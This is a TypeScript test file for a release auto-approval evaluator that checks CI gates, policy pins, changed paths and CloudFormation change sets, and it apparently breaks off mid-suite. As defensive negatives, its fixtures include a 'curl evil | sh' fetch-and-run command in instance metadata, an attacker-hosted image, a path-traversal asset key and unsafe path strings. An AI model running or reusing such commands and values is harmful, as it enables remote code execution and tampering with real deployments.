/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument -- the tests build and break plain CloudFormation JSON at a path, which a typed document would not allow */
// Rules A to I, P-EDIT, P-ORDER, P-RB and the fail-closed behaviour: each rule has a positive case (routine fixtures are AUTO) and negatives (each MUST give MANUAL).
import { describe, expect, it } from "vitest";
import { evaluate } from "../src/evaluate.ts";
import { sha256Hex } from "../src/util.ts";
import { ACCT, CP, GWS, KNOWN, NEW, NOW, OLD, POLICY_TEXT, REPO_HOST, RT, SHA, SL, TREE, WEB, auto, ciRunFix, cloudInput, codeInput, detail, changesOf, hex, imageEntry, lambdaRes, lambdaRow, manifestFor, metaRow, param, repin, row, rowIn, stackIn, uri } from "./fixtures-index.ts";
import { attack, manual } from "./helpers.ts";

describe("A: mode", () => {
  it("manual check mode", () => attack(codeInput, (i) => { i.checkMode = "manual"; }, "check-mode", "A"));
  it("a HOLD is present", () => attack(codeInput, (i) => { i.holdParameters = ["/rovara-release/staging/code-hold/x"]; }, "hold", "A"));
  it("unaudited backlog: 3 is fine, 4 is MANUAL", () => {
    const ok = codeInput();
    ok.unauditedAutoRuns = 3;
    auto(ok);
    attack(codeInput, (i) => { i.unauditedAutoRuns = 4; }, "audit-backlog", "A");
  });
  it("a human-set variable", () => attack(codeInput, (i) => { i.trigger.variables = { ONLY_PARTS: "runtime" }; }, "variables-set", "A"));
  it("started by a human", () => attack(codeInput, (i) => { i.trigger.kind = "human"; }, "trigger-kind", "A"));
  it("a negative unaudited count is invalid input", () => attack(codeInput, (i) => { i.unauditedAutoRuns = -1; }));
});

describe("P-ORDER: never an older or equal sha over the installed one", () => {
  it("equal sha", () => attack(codeInput, (i) => { i.previousInstalledSha = i.sha; }, "same-sha", "P-ORDER"));
  it("installed is not an ancestor (older or unrelated sha)", () => attack(codeInput, (i) => { i.ancestry.installedIsAncestorOfSha = false; }, "not-forward", "P-ORDER"));
  it("malformed sha", () => attack(codeInput, (i) => { i.sha = "ABC"; }));
  it("short previous sha", () => attack(codeInput, (i) => { i.previousInstalledSha = hex("a", 39); }));
});

describe("P-EDIT: the policy pin", () => {
  it("a policy file edited without a re-pin (pin mismatch / file hash)", () => attack(codeInput, (i) => { i.policyFiles["manual-paths.txt"] += "\n# edit"; }, undefined, "P-EDIT"));
  it("a manifest that no longer matches the pin", () => attack(codeInput, (i) => { i.policyManifest[3].sha256 = sha256Hex("edited evaluator"); }, "pin-mismatch", "P-EDIT"));
  it("the evaluator code is part of the manifest: removing an entry changes the hash", () => attack(codeInput, (i) => { i.policyManifest = i.policyManifest.slice(0, 3); }, "pin-mismatch", "P-EDIT"));
  it("pin is MANUAL-ONLY", () => attack(codeInput, (i) => { i.policyPin = "MANUAL-ONLY"; }, "pin-manual-only", "P-EDIT"));
  it("pin is not a sha256", () => attack(codeInput, (i) => { i.policyPin = "abc"; }, "pin-invalid", "P-EDIT"));
  it("a re-pinned but different policy file passes the pin yet the file must be the manifest's", () => attack(codeInput, (i) => { i.policyManifest[0].sha256 = hex("9", 64); i.policyPin = "x"; }));
  it("a policy that was edited AND re-pinned is trusted only if valid: an invalid policy fails closed", () => attack(codeInput, (i) => { i.policyFiles["auto-approve-policy.json"] = "{ not json"; repin(i); }, "parse-error"));
  it("an unknown policy key fails closed", () => attack(codeInput, (i) => { const p = JSON.parse(i.policyFiles["auto-approve-policy.json"]); p.surprise = 1; i.policyFiles["auto-approve-policy.json"] = JSON.stringify(p); repin(i); }, "unknown-field"));
  it("a policy pattern that is not anchored fails closed", () => attack(codeInput, (i) => { const p = JSON.parse(i.policyFiles["auto-approve-policy.json"]); p.pipelines.code.stacks[CP].rules[0].logicalIdPattern = ".*"; i.policyFiles["auto-approve-policy.json"] = JSON.stringify(p); repin(i); }, "policy-invalid"));
  it("an extra policy file name is refused", () => attack(codeInput, (i) => { i.policyFiles["evil.txt"] = "x"; }));
});

describe("B: gates", () => {
  const gate = (i: Record<string, any>, name: string): Record<string, any> => i.gates.find((g: Record<string, any>) => g.name === name);
  it("each required code gate missing is MANUAL", () => {
    for (const name of ["25-gate", "15-gate", "45-gate", "46-gate", "gate-gateway-deployed", "gate-gateway-runprice", "50-dry-run"]) {
      attack(codeInput, (i) => { i.gates = i.gates.filter((g: Record<string, any>) => g.name !== name); }, "gate-missing", "B");
    }
  });
  it("each required cloud gate missing is MANUAL", () => {
    for (const name of ["16-gate", "16b-gate", "16c-gate", "gate-gateway-runprice"]) attack(cloudInput, (i) => { i.gates = i.gates.filter((g: Record<string, any>) => g.name !== name); }, "gate-missing", "B");
  });
  it("a gate older than 2 hours", () => attack(codeInput, (i) => { gate(i, "25-gate").writtenAt = "2026-11-23T09:59:00Z"; }, "gate-stale", "B"));
  it("exactly inside 2 hours is fine", () => { const i = codeInput(); gate(i, "25-gate").writtenAt = "2026-11-23T10:01:00Z"; auto(i); });
  it("a gate from the future", () => attack(codeInput, (i) => { gate(i, "25-gate").writtenAt = "2026-11-23T13:00:00Z"; }, "gate-future", "B"));
  it("a gate naming another sha", () => attack(codeInput, (i) => { gate(i, "45-gate").sha = hex("e"); }, "gate-sha", "B"));
  it("a failed gate", () => attack(codeInput, (i) => { gate(i, "15-gate").result = "fail"; }, "gate-failed", "B"));
  it("46- skipped for another reason", () => attack(codeInput, (i) => { gate(i, "46-gate").skippedReason = "because"; }, "gate-skip-reason", "B"));
  it("46- passing is fine", () => { const i = codeInput(); gate(i, "46-gate").result = "pass"; delete gate(i, "46-gate").skippedReason; auto(i); });
  it("25- may not be skipped", () => attack(codeInput, (i) => { gate(i, "25-gate").result = "skipped"; gate(i, "25-gate").skippedReason = "DEC 254zzz397"; }, "gate-skipped", "B"));
  it("the 50- dry run has a real FAIL", () => attack(codeInput, (i) => { gate(i, "50-dry-run").failures = ["ready-guard", "disk-space"]; }, "dry-run-failures", "B"));
  it("an unknown gate marker", () => attack(codeInput, (i) => { i.gates.push({ name: "99-extra", sha: SHA, writtenAt: "2026-11-23T11:55:00Z", result: "pass" }); }, "gate-unknown", "B"));
  it("a duplicated gate marker", () => attack(codeInput, (i) => { i.gates.push({ ...gate(i, "25-gate") }); }, "gate-duplicate", "B"));
  it("a gate with an unknown field fails closed", () => attack(codeInput, (i) => { gate(i, "25-gate").extra = true; }, "unknown-field"));
});

describe("C: CI green on this sha's tree (P-CI)", () => {
  const run = (i: Record<string, any>): Record<string, any> => i.ci.runs[0];
  it("no run", () => attack(codeInput, (i) => { i.ci.runs = []; }, "ci-missing", "C"));
  it("a GitHub API error", () => attack(codeInput, (i) => { i.ci.apiError = "rate limited"; }, "ci-api-error", "C"));
  it("a run from a fork", () => attack(codeInput, (i) => { run(i).head_repository.full_name = "someone/rovara"; }, "ci-not-green", "C"));
  it("a deleted fork (null head repository)", () => attack(codeInput, (i) => { run(i).head_repository = null; }, "ci-not-green", "C"));
  it("a run in another repository", () => attack(codeInput, (i) => { run(i).repository.full_name = "someone/rovara"; }, "ci-not-green", "C"));
  it("a run of another workflow file", () => attack(codeInput, (i) => { run(i).path = ".github/workflows/other.yml"; }, "ci-not-green", "C"));
  it("an event outside push / pull_request / workflow_dispatch", () => attack(codeInput, (i) => { run(i).event = "schedule"; }, "ci-not-green", "C"));
  it("a run that is not completed", () => attack(codeInput, (i) => { run(i).status = "in_progress"; run(i).conclusion = null; }, "ci-not-green", "C"));
  it("a failed run", () => attack(codeInput, (i) => { run(i).conclusion = "failure"; }, "ci-not-green", "C"));
  it("a run on a different git tree", () => attack(codeInput, (i) => { run(i).head_commit.tree_id = hex("9"); }, "ci-not-green", "C"));
  it("a run with no head commit", () => attack(codeInput, (i) => { delete run(i).head_commit; }, "ci-not-green", "C"));
  it("a required job missing", () => attack(codeInput, (i) => { run(i).jobs = run(i).jobs.filter((j: Record<string, any>) => j.name !== "ci-mode (full)"); }, "ci-not-green", "C"));
  it("a required job failed", () => attack(codeInput, (i) => { run(i).jobs[0].conclusion = "failure"; }, "ci-not-green", "C"));
  it("a check run created by another app", () => attack(codeInput, (i) => { run(i).checkRuns[0].app.slug = "aws-codeconnections"; }, "ci-not-green", "C"));
  it("a check run with no app", () => attack(codeInput, (i) => { delete run(i).checkRuns[0].app; }, "ci-not-green", "C"));
  it("a job that is not in the check runs", () => attack(codeInput, (i) => { run(i).checkRuns = []; }, "ci-not-green", "C"));
  it("the head sha may differ from the merge sha (tree match): positive", () => { const i = codeInput(); expect(run(i).head_sha).not.toBe(SHA); auto(i); });
  it("one bad run does not hide a good run, but only bad runs is MANUAL", () => {
    const i = codeInput();
    i.ci.runs.unshift(ciRunFix({ id: 1, conclusion: "failure" }, ["local", "ci-mode (full)"]));
    auto(i);
  });
  it("cloud needs only the local job", () => { const i = cloudInput(); expect(i.ci.runs[0].jobs).toHaveLength(1); auto(i); });
});

describe("D: paths", () => {
  const paths: [string, string][] = [
    [".github/workflows/ci.yml", "CI itself"],
    ["ops/staging-release/policy/auto-approve-policy.json", "the policy"],
    ["ops/staging-release/evaluator/src/evaluate.ts", "the evaluator"],
    ["infra/lib/staging-release-pipeline.ts", "a pipeline stack"],
    ["infra/lib/access-stack.ts", "access"],
    ["infra/lib/permissions-boundary.ts", "boundary"],
    ["infra/lib/iam-roles.ts", "iam roles"],
    ["packages/contracts/src/access-policies.ts", "access policies"],
    ["infra/lib/cloud-boundary-check.ts", "cloud boundary"],
    ["scripts/release/run.ts", "release scripts"],
    ["scripts/release-production.ts", "release script"],
    ["package.json", "root package.json"],
    ["packages/cli/package.json", "workspace package.json"],
    [".node-version", "node version"],
    ["environments/base/Dockerfile", "base Dockerfile"],
    ["packages/x/Dockerfile", "a Dockerfile"],
    ["packages/x/Dockerfile.prod", "a Dockerfile variant"],
    [".npmrc", "npmrc"],
    ["packages/broker/src/aws/core-backfill-runner.ts", "a backfill runner"],
    ["scripts/backfill-feedback.ts", "a backfill script"],
    ["docs/release-steps/0.5.49.md", "a release-step marker"],
    ["docs/staging-runbook.md", "a runbook"],
    ["packages/x/migrations/001.sql", "a migration"],
    ["yarn.lock", "another lockfile"],
    ["packages/x/package-lock.json", "a workspace lockfile"],
    [".GitHub/workflows/ci.yml", "a differently cased manual path"],
    ["INFRA/LIB/IAM-ROLES.TS", "an upper-cased manual path"],
  ];
  for (const [path, why] of paths) it(`${why} (${path}) is MANUAL`, () => attack(codeInput, (i) => { i.changedPaths.push(path); }, undefined, "D"));
  it("an unknown path is MANUAL (allow-list only)", () => attack(codeInput, (i) => { i.changedPaths.push("weird/thing.bin"); }, "unknown-path", "D"));
  it("a path with a case-variant of an allowed directory is not on the allow-list", () => attack(codeInput, (i) => { i.changedPaths.push("Packages/x/a.ts"); }, "unknown-path", "D"));
  for (const bad of ["../x", "/abs/path", "a\\b", "a//b", "./a", "a/./b", "dir/", "café.ts", "\"quoted\".ts", "a\u0000b", ""]) {
    it(`an unsafe path (${JSON.stringify(bad)}) fails closed`, () => attack(codeInput, (i) => { i.changedPaths.push(bad); }));
  }
  it("a non-string path", () => attack(codeInput, (i) => { i.changedPaths.push(5); }));
  it("ordinary code, tests and docs are fine", () => { const i = codeInput(); i.changedPaths = ["packages/web/src/x.tsx", "tests/unit/y.test.ts", "docs/safe-action.md", "README.md"]; auto(i); });
});

describe("E: parameters and templates", () => {
  const csParam = (i: Record<string, any>, stack: string, key: string): Record<string, any> => stackIn(i, stack).changeSet.Parameters.find((p: Record<string, any>) => p.ParameterKey === key);
  it("a non-image parameter changed", () => attack(codeInput, (i) => { csParam(i, CP, "StageName").ParameterValue = "prod"; }, "param-changed", "E"));
  it("a new parameter in the change set", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.Parameters.push(param("Extra", "1")); }, "param-set", "E"));
  it("a parameter missing from the change set", () => attack(codeInput, (i) => { stackIn(i, CP).changeSet.Parameters.pop(); }, "param-set", "E"));
  it("another NoEcho parameter", () => attack(codeInput, (i) => { const s = stackIn(i, CP); s.newTemplate.Parameters.StageName.NoEcho = true; s.liveTemplate.Parameters.StageName.NoEcho = true; }, "noecho", "E"));
  it("another NoEcho parameter even when masked and unchanged", () => attack(codeInput, (i) => { const s = stackIn(i, CP); s.newTemplate.Parameters.StageName.NoEcho = true; s.liveTemplate.Parameters.StageName.NoEcho = true; s.liveParameters[1].ParameterValue = "****"; csParam(i, CP, "StageName").ParameterValue = "****"; }, "noecho", "E"));
  it("CallbackSigningKey showing a real value", () => attack(codeInput, (i) => { csParam(i, CP, "CallbackSigningKey").ParameterValue = "plain-text"; }, "noecho", "E"));
  it("CallbackSigningKey with UsePreviousValue is fine", () => { const i = codeInput(); const p = csParam(i, CP, "CallbackSigningKey"); delete p.ParameterValue; p.UsePreviousValue = true; auto(i); });
  it("NoEcho on the cloud pipeline (no NoEcho allowed there)", () => attack(cloudInput, (i) => { const s = stackIn(i, GWS); s.newTemplate.Parameters.CertificateArn.NoEcho = true; s.liveTemplate.Parameters.CertificateArn.NoEcho = true; }, "noecho", "E"));
  it("an image URI in the wrong repository", () => attack(codeInput, (i) => { csParam(i, RT, "WorkerImageUri").ParameterValue = uri("rovara-evil", NEW.worker); }, "image", "E"));
  it("an image URI in another account", () => attack(codeInput, (i) => { csParam(i, RT, "WorkerImageUri").ParameterValue = `222222222222.dkr.ecr.us-west-2.amazonaws.com/agentx-staging/worker@${NEW.worker}`; }, "image", "E"));
  it("an image URI in another region", () => attack(codeInput, (i) => { csParam(i, RT, "WorkerImageUri").ParameterValue = `${ACCT}.dkr.ecr.us-east-1.amazonaws.com/agentx-staging/worker@${NEW.worker}`; }, "image", "E"));
  it("an image given by tag, not digest", () => attack(codeInput, (i) => { csParam(i, RT, "WorkerImageUri").ParameterValue = `${REPO_HOST}/agentx-staging/worker:latest`; }, "image", "E"));
  it("an image on another host", () => attack(codeInput, (i) => { csParam(i, RT, "WorkerImageUri").ParameterValue = `evil.example/agentx-staging/worker@${NEW.worker}`; }, "image", "E"));
  it("an image digest this run did not build or reuse", () => attack(codeInput, (i) => { csParam(i, RT, "WorkerImageUri").ParameterValue = uri("agentx-staging/worker", `sha256:${hex("7", 64)}`); }, "image", "E"));
  it("the gateway digest in the wrong format", () => attack(cloudInput, (i) => { csParam(i, GWS, "ImageDigest").ParameterValue = "sha256:short"; }, "image", "E"));
  it("the gateway digest unverified", () => attack(cloudInput, (i) => { csParam(i, GWS, "ImageDigest").ParameterValue = `sha256:${hex("7", 64)}`; }, "image", "E"));
  it("ExecutorImageUri changed from none", () => attack(codeInput, (i) => { csParam(i, SL, "ExecutorImageUri").ParameterValue = uri("agentx-staging/slack-executor", NEW.slack); }, "param-changed", "E"));
  it("ExecutorImageUri live value not none", () => attack(codeInput, (i) => { const s = stackIn(i, SL); s.liveParameters[1].ParameterValue = "x"; csParam(i, SL, "ExecutorImageUri").ParameterValue = "x"; }, "param-changed", "E"));
  it("a region other than us-west-2", () => attack(codeInput, (i) => { i.environment.region = "us-east-1"; }, "region", "E"));
  it("answers.json differs beyond images", () => attack(codeInput, (i) => { i.answers.current = JSON.stringify({ company: "y", images: { worker: uri("agentx-staging/worker", NEW.worker), slack: uri("agentx-staging/slack", NEW.slack) } }); }, "answers-differs", "E"));
  it("answers.json gains a key", () => attack(codeInput, (i) => { i.answers.current = JSON.stringify({ company: "x", extra: 1, images: { worker: uri("agentx-staging/worker", NEW.worker), slack: uri("agentx-staging/slack", NEW.slack) } }); }, "answers-differs", "E"));
  it("answers.json adds an image key", () => attack(codeInput, (i) => { i.answers.current = JSON.stringify({ company: "x", images: { worker: uri("agentx-staging/worker", NEW.worker), slack: uri("agentx-staging/slack", NEW.slack), extra: uri("agentx-staging/worker", NEW.worker) } }); }, "answers-differs", "E"));
  it("answers.json image value without a verified digest", () => attack(codeInput, (i) => { i.answers.current = JSON.stringify({ company: "x", images: { worker: uri("agentx-staging/worker", `sha256:${hex("7", 64)}`), slack: uri("agentx-staging/slack", NEW.slack) } }); }, "answers-image", "E"));
  it("overrides.json differs beyond images", () => attack(codeInput, (i) => { i.overrides.current = JSON.stringify({ images: { worker: uri("agentx-staging/worker", NEW.worker) }, flags: { x: 1 } }); }, "overrides-differs", "E"));
  it("overrides.json is not JSON", () => attack(codeInput, (i) => { i.overrides.current = "{"; }, "parse-error"));
  it("a parameter definition added to the new template", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Parameters.Fresh = { Type: "String" }; }, "template-section", "E"));
  it("a parameter definition changed (default)", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Parameters.StageName.Default = "x"; }, "template-section", "E"));
  it("an output added", () => attack(codeInput, (i) => { stackIn(i, RT).newTemplate.Outputs = { O: { Value: "x" } }; }, "template-section", "E"));
  it("a Transform added", () => attack(codeInput, (i) => { stackIn(i, RT).newTemplate.Transform = "AWS::Serverless-2016-10-31"; }, "template-section", "E"));
  it("a Mapping added", () => attack(codeInput, (i) => { stackIn(i, RT).newTemplate.Mappings = { M: {} }; }, "template-section", "E"));
  it("a Condition other than CDKMetadataAvailable changed", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Conditions.UseX = { "Fn::Equals": ["a", "b"] }; }, "template-section", "E"));
  it("a Condition added", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Conditions.Fresh = { "Fn::Equals": ["a", "a"] }; }, "template-section", "E"));
  it("CDKMetadataAvailable rewritten (not removed)", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Conditions.CDKMetadataAvailable = { "Fn::Equals": ["a", "a"] }; }, "template-section", "E"));
  it("the CDKMetadataAvailable removal alone is fine (amendment 7)", () => { const i = codeInput(); expect(stackIn(i, CP).newTemplate.Conditions.CDKMetadataAvailable).toBeUndefined(); auto(i); });
  it("a Conditions section that appears only in the new template", () => attack(codeInput, (i) => { const s = stackIn(i, "agentx-staging-foundation"); s.liveTemplate.Conditions = undefined; delete s.liveTemplate.Conditions; }, "template-section", "E"));
});

describe("F and G: rows are an allow-list", () => {
  const cpChanges = (i: Record<string, any>): Record<string, any>[] => changesOf(i, CP);
  it("an unknown resource type", () => attack(codeInput, (i) => { stackIn(i, CP).liveTemplate.Resources.Mystery = { Type: "AWS::Mystery::Thing" }; stackIn(i, CP).newTemplate.Resources.Mystery = { Type: "AWS::Mystery::Thing", Properties: { A: 1 } }; cpChanges(i).push(row("Mystery", "AWS::Mystery::Thing", "Modify", "False", ["Properties"], [detail("Properties", "A", "/Properties/A", "DirectModification", "Static")])); }, "row-rejected", "F"));
  it("an extra property inside an allowed Lambda row", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Properties", "MemorySize", "/Properties/MemorySize", "DirectModification", "Static", { AfterValue: "10240" })); stackIn(i, CP).newTemplate.Resources.BrokerE1355FD6.Properties.MemorySize = 10240; }, "row-rejected", "F"));
  it("an extra property in the row only (template unchanged)", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Properties", "Timeout", "/Properties/Timeout", "DirectModification", "Static")); }, "row-rejected", "F"));
  it("an extra property in the template only (row unchanged)", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Resources.BrokerE1355FD6.Properties.Role = "arn:aws:iam::111111111111:role/admin"; }, "row-rejected", "F"));
  it("an env var added beside a code change", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Properties", "Environment", "/Properties/Environment/Variables/EVIL", "DirectModification", "Static", { AfterValue: "1" })); stackIn(i, CP).newTemplate.Resources.BrokerE1355FD6.Properties.Environment.Variables.EVIL = "1"; }, "row-rejected", "F"));
  it("an env var added beside an image change (Lambda env driven by the image parameter)", () => attack(codeInput, (i) => {
    rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Properties", "Environment", "/Properties/Environment/Variables/EVIL", "ParameterReference", "Static", { CausingEntity: "WorkerImageUri", BeforeValue: "a", AfterValue: "b" }));
  }, "row-rejected", "F"));
  it("a Lambda S3Bucket change", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Properties", "Code", "/Properties/Code/S3Bucket", "DirectModification", "Static", { AfterValue: "evil-bucket" })); stackIn(i, CP).newTemplate.Resources.BrokerE1355FD6.Properties.Code.S3Bucket = "evil-bucket"; }, "row-rejected", "F"));
  it("a Lambda S3Key that is not an asset key", () => attack(codeInput, (i) => { const r = rowIn(i, CP, "BrokerE1355FD6"); r.Details[r.Details.length - 1].Target.AfterValue = "../../evil.zip"; }, "row-rejected", "F"));
  it("a Lambda row that replaces", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Replacement = "True"; }, "row-rejected", "F"));
  it("a Lambda row with a Conditional replacement", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Replacement = "Conditional"; }, "row-rejected", "F"));
  it("a Lambda row with no details", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details = []; }, "row-rejected", "F"));
  it("a Lambda row with a Tags property detail", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Tags", "Tags", null, "DirectModification", "Static")); }, "row-rejected", "F"));
  it("a Lambda row with a CreationPolicy detail", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("CreationPolicy", null, null, "DirectModification", "Static")); }, "row-rejected", "F"));
  it("a Lambda row with a property detail lacking a path", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Properties", "Handler", null, "DirectModification", "Static")); }, "row-rejected", "F"));
  it("an unknown field in a row", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Mystery = 1; }, "unknown-field"));
  it("an unknown field in a detail", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details[0].Mystery = 1; }, "unknown-field"));
  it("an unknown field in a target", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details[0].Target.Mystery = 1; }, "unknown-field"));
  it("a hook change", () => attack(codeInput, (i) => { cpChanges(i).push({ Type: "Hook", HookInvocationCount: 1 }); }, "row-type"));
  it("a module row", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").ModuleInfo = { TypeHierarchy: "x", LogicalIdHierarchy: "y" }; }, "row-module"));
  it("a PolicyAction on a Lambda row", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").PolicyAction = "Retain"; }, "row-rejected", "F"));
  it("a duplicated row", () => attack(codeInput, (i) => { cpChanges(i).push(structuredClone(cpChanges(i)[0] as Record<string, any>)); }, "row-rejected", "F"));
  it("a Metadata detail on a path outside the four", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details.push(detail("Metadata", null, "/Metadata/AWS::CloudFormation::Init", "DirectModification", "Static", { AttributeChangeType: "Remove" })); }, "row-rejected", "F"));
  it("a Metadata detail that is an Add", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details[0].Target.AttributeChangeType = "Add"; }, "row-rejected", "F"));
  it("a Metadata detail from a ParameterReference", () => attack(codeInput, (i) => { rowIn(i, CP, "BrokerE1355FD6").Details[0].ChangeSource = "ParameterReference"; }, "row-rejected", "F"));
  it("a Metadata-only row whose template differs outside the metadata keys (AWS::CloudFormation::Init)", () => attack(codeInput, (i) => {
    cpChanges(i).push(metaRow("Box", "AWS::EC2::Instance"));
    stackIn(i, CP).liveTemplate.Resources.Box = { Type: "AWS::EC2::Instance", Metadata: { "AWS::CloudFormation::Init": { config: { commands: { a: { command: "true" } } } } } };
    stackIn(i, CP).newTemplate.Resources.Box = { Type: "AWS::EC2::Instance", Metadata: { "AWS::CloudFormation::Init": { config: { commands: { a: { command: "curl evil | sh" } } } } } };
  }, "row-rejected", "F"));
  it("a Metadata-only row whose whole Metadata block holds another key", () => attack(codeInput, (i) => {
    cpChanges(i).push(metaRow("Box", "AWS::EC2::Instance"));
    stackIn(i, CP).liveTemplate.Resources.Box = { Type: "AWS::EC2::Instance", Metadata: { "aws:cdk:path": "x", Other: { a: 1 } } };
    stackIn(i, CP).newTemplate.Resources.Box = { Type: "AWS::EC2::Instance" };
  }, "row-rejected", "F"));
  it("an Add row", () => attack(codeInput, (i) => { cpChanges(i).push(row("GithubWebhookSecret", "AWS::SecretsManager::Secret", "Add", null, [], [])); }, "row-rejected", "G"));
  it("an Add of an alarm", () => attack(codeInput, (i) => { cpChanges(i).push(row("Alarm", "AWS::CloudWatch::Alarm", "Add", null, [], [])); }, "row-rejected", "F"));
  it("a Remove of a data resource", () => attack(codeInput, (i) => { cpChanges(i).push(row("Table", "AWS::DynamoDB::Table", "Remove", null, [], [])); }, "row-rejected", "G"));
  it("a Remove that is not CDK metadata", () => attack(codeInput, (i) => { cpChanges(i).push(row("Fn", "AWS::Lambda::Function", "Remove", null, [], [])); }, "row-rejected", "F"));
  it("an Add of CDK metadata", () => attack(codeInput, (i) => { const c = cpChanges(i).find((x: Record<string, any>) => x.ResourceChange.ResourceType === "AWS::CDK::Metadata"); (c as Record<string, any>).ResourceChange.Action = "Add"; }, "row-rejected", "F"));
  it("an IAM role row", () => attack(codeInput, (i) => { cpChanges(i).push(row("RoleX", "AWS::IAM::Role", "Modify", "False", ["Properties"], [detail("Properties", "AssumeRolePolicyDocument", "/Properties/AssumeRolePolicyDocument", "DirectModification", "Static")])); }, "row-rejected", "G"));
  it("an IAM managed policy row", () => attack(codeInput, (i) => { cpChanges(i).push(row("PolicyX", "AWS::IAM::ManagedPolicy", "Modify", "False", ["Properties"], [detail("Properties", "PolicyDocument", "/Properties/PolicyDocument", "DirectModification", "Static")])); }, "row-rejected", "G"));
  for (const type of ["AWS::DynamoDB::Table", "AWS::RDS::DBInstance", "AWS::S3::Bucket", "AWS::SecretsManager::Secret", "AWS::KMS::Key", "AWS::EFS::FileSystem", "AWS::SQS::Queue", "AWS::SNS::Topic", "AWS::Logs::LogGroup", "AWS::Cognito::UserPool", "AWS::Route53::RecordSet", "AWS::Route53Resolver::ResolverRule", "AWS::EC2::SecurityGroup", "AWS::CloudFront::Distribution"]) {
    it(`a ${type} row with real property changes`, () => attack(codeInput, (i) => { cpChanges(i).push(row("Thing", type, "Modify", "True", ["Properties"], [detail("Properties", "X", "/Properties/X", "DirectModification", "Static")])); }, "row-rejected", "G"));
  }
  it("a secret row that is not the signing key", () => attack(codeInput, (i) => { cpChanges(i).push(row("OtherSecret", "AWS::SecretsManager::Secret", "Modify", "False", ["Properties"], [detail("Properties", "SecretString", "/Properties/SecretString", "ParameterReference", "Static", { CausingEntity: "CallbackSigningKey" })])); }, "row-rejected", "G"));
  it("DeletionPolicy changed with no row for it", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Resources.Other = { Type: "AWS::S3::Bucket", DeletionPolicy: "Delete" }; stackIn(i, CP).liveTemplate.Resources.Other = { Type: "AWS::S3::Bucket", DeletionPolicy: "Retain" }; }, "template-no-row", "G"));
  it("UpdateReplacePolicy / UpdatePolicy / Condition / DependsOn changed with no row", () => {
    for (const key of ["UpdateReplacePolicy", "UpdatePolicy", "Condition", "DependsOn"]) attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Resources.Other = { Type: "AWS::S3::Bucket", [key]: "x" }; stackIn(i, CP).liveTemplate.Resources.Other = { Type: "AWS::S3::Bucket" }; }, "template-no-row", "G");
  });
  it("a resource only in the new template with no row", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Resources.Sneaky = { Type: "AWS::IAM::Role", Properties: {} }; }, "template-no-row", "G"));
  it("a resource only in the live template with no row", () => attack(codeInput, (i) => { stackIn(i, CP).liveTemplate.Resources.Gone = { Type: "AWS::S3::Bucket" }; }, "template-no-row", "G"));
  it("the CDKMetadata exemption is only for that logical id", () => attack(codeInput, (i) => { stackIn(i, CP).liveTemplate.Resources.Other = { Type: "AWS::CDK::Metadata", Properties: { A: 1 } }; }, "template-no-row", "G"));
  it("a SecretsManager signing-key row with a changed template (DeletionPolicy)", () => attack(codeInput, (i) => { stackIn(i, CP).newTemplate.Resources.CallbackSigningKeySecret28D4CB19.DeletionPolicy = "Delete"; }, "row-rejected", "F"));
  it("the signing-key row on a different parameter", () => attack(codeInput, (i) => { rowIn(i, CP, "CallbackSigningKeySecret28D4CB19").Details[0].CausingEntity = "StageName"; }, "row-rejected", "F"));
  it("the signing-key row with a second property detail", () => attack(codeInput, (i) => { rowIn(i, CP, "CallbackSigningKeySecret28D4CB19").Details.push(detail("Properties", "Name", "/Properties/Name", "DirectModification", "Static")); }, "row-rejected", "F"));
  it("the signing-key row showing a visible value", () => attack(codeInput, (i) => { rowIn(i, CP, "CallbackSigningKeySecret28D4CB19").Details[0].Target.AfterValue = "leaked"; }, "row-rejected", "F"));
  it("the signing-key row replaced", () => attack(codeInput, (i) => { rowIn(i, CP, "CallbackSigningKeySecret28D4CB19").Replacement = "True"; }, "row-rejected", "F"));
  it("a Dynamic DirectModification detail with no Static partner stays a detail and is judged", () => attack(codeInput, (i) => { rowIn(i, RT, "WorkerImageParameter7CA9ADBB").Details = rowIn(i, RT, "WorkerImageParameter7CA9ADBB").Details.filter((d: Record<string, any>) => d.ChangeSource !== "ParameterReference"); }, "row-rejected", "F"));
  it("a Dynamic twin on a different path is not folded away", () => attack(codeInput, (i) => { rowIn(i, RT, "WorkerImageParameter7CA9ADBB").Details.push(detail("Properties", "Description", "/Properties/Description", "DirectModification", "Dynamic")); }, "row-rejected", "F"));
  it("R2 SSM Value from the wrong parameter", () => attack(codeInput, (i) => { rowIn(i, RT, "WorkerImageParameter7CA9ADBB").Details[2].CausingEntity = "Other"; }, "row-rejected", "F"));
